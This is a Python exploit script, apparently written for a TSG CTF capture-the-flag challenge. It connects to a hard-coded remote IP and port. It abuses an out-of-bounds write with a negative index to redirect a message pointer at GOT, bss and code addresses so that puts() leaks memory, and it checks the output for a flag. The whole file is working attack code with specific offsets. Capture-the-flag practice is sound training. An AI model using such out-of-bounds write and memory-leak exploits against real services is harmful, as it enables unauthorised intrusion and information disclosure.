#!/usr/bin/env python3
"""
New approach: Use OOB write to LEAK memory instead of RCE
Maybe flag is in memory somewhere?
"""
import socket
import time
import struct

def connect_and_read():
    s = socket.socket()
    s.settimeout(10)
    s.connect(('34.84.25.24', 58554))
    return s

def send_pair(s, idx, val):
    s.recv(4096)
    s.sendall(f"{idx}\n".encode())
    time.sleep(0.05)
    s.recv(4096)
    s.sendall(f"{val}\n".encode())
    time.sleep(0.05)

# Strategy: Just set msg pointer to different addresses and let puts() leak them
print("[*] Trying to leak memory by pointing msg to various addresses...")

interesting_addrs = {
    'values array': 0x6010c0,
    'original msg': 0x601068,
    'environment': 0x601200,  # After bss
    'GOT area': 0x601000,
    'plt area': 0x400600,
    'code area': 0x400800,
}

for name, addr in interesting_addrs.items():
    print(f"\n{'='*60}")
    print(f"Leaking: {name} at {hex(addr)}")
    print('='*60)
    
    try:
        s = connect_and_read()
        
        # Point msg to target address
        offset_msg = -22
        send_pair(s, offset_msg, addr & 0xFFFFFFFF)
        send_pair(s, offset_msg + 1, addr >> 32)
        
        # Exit and read leak
        s.recv(4096)
        s.sendall(b"-1\n")
        time.sleep(0.5)
        
        output = s.recv(8192)
        print(f"Output ({len(output)} bytes):")
        print(output)
        
        # Check for flag
        if b'TSGCTF{' in output or b'flag{' in output.lower():
            print("\n[+] POSSIBLE FLAG FOUND!")
            print(output.decode(errors='ignore'))
        
        s.close()
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)
